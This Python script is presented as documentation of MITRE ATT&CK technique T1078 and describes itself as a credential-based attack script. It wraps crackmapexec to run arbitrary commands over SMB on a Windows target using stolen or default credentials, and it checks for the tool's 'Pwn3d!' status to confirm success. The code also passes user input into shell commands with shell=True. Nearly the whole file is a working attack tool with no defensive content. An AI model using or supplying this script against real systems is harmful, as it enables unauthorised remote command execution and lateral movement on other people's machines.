# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1078: Valid Account
# Objective: Involves using legitimate credentials to access a target system. 
# This script demonstrates how to leverage stolen or default credentials for lateral movement or privilege escalation on a Windows target.

#!/usr/bin/env python3
import json
import subprocess
import sys
import argparse
from getpass import getpass

def run_command(command, username=None, password=None, host=None):
    try:
        if username and password and host:
            # Use the --json flag for cleaner parsing
            cmd = f"crackmapexec smb {host} -u '{username}' -p '{password}' -x '{command}' --json"
            print(f"[+] Running command on {host} as {username}: {command}")
            print(f"[*] Executing: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            print(f"[+] Running command locally: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            print("[+] Command executed successfully!")
            
            # --- Parsing the JSON output ---
            try:
                # CrackMapExec outputs a JSON list, even for one host
                output_data = json.loads(result.stdout)
                
                # Get the first (and likely only) host's data
                host_data = output_data[0]
                
                # Check if the execution was successful
                if host_data.get('status') == 'Pwn3d!':
                    # The command output is in the 'output' field
                    command_output = host_data.get('output', 'No output returned.')
                    print("\n--- PARSED COMMAND OUTPUT (from JSON) ---")
                    print(command_output)
                    print("---------------------------------------")
                else:
                    print(f"\n[-] CrackMapExec reported an error: {host_data.get('status')}")

            except (json.JSONDecodeError, IndexError, KeyError) as e:
                print(f"\n[-] Failed to parse CrackMapExec JSON output: {e}")
                print("[-] Falling back to raw output:")
                print(result.stdout)

        else:
            print(f"[-] Error executing command.")
            print(f"[-] Return Code: {result.returncode}")
            print(f"[-] Stderr: {result.stderr}")

    except Exception as e:
        print(f"[-] An unexpected exception occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description="MITRE T1078: Valid Accounts - Credential-Based Attack Script")
    parser.add_argument("--username", help="Username for authentication (e.g., 'Administrator')")
    parser.add_argument("--password", help="Password for authentication (leave blank to prompt)")
    parser.add_argument("--host", help="Target host (e.g., '192.168.1.100')")
    parser.add_argument("--command", help="Command to execute (e.g., 'whoami')")
    args = parser.parse_args()

    # Check for the command first.
    if not args.command:
        print("[-] Error: --command is required!")
        sys.exit(1)

    # Get the password BEFORE using it in a check.
    password = args.password if args.password else getpass("Enter password: ")

    # Safely check the host and credentials.
    if args.host and not (args.username and password):
        print("[-] Error: For remote execution, --host, --username, and --password are required!")
        sys.exit(1)

    run_command(args.command, args.username, password, args.host)

if __name__ == "__main__":
    main()